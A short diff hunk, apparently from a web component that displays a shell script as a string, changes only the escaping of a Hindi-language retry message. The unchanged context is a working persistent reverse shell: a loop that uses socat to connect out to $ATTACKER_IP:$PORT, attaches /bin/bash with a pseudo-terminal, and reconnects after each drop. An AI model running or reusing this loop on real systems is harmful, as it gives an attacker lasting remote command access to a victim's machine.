@@ -491,7 +491,7 @@ while true; do
   socat TCP:$ATTACKER_IP:$PORT,connect-timeout=10,retry=3 \\
     EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 
-  echo "[+] Connection drop हुआ, ${DELAY}s बाद retry..."
+  echo "[+] Connection drop हुआ, \${DELAY}s बाद retry..."
   sleep $DELAY
 done`}
       />
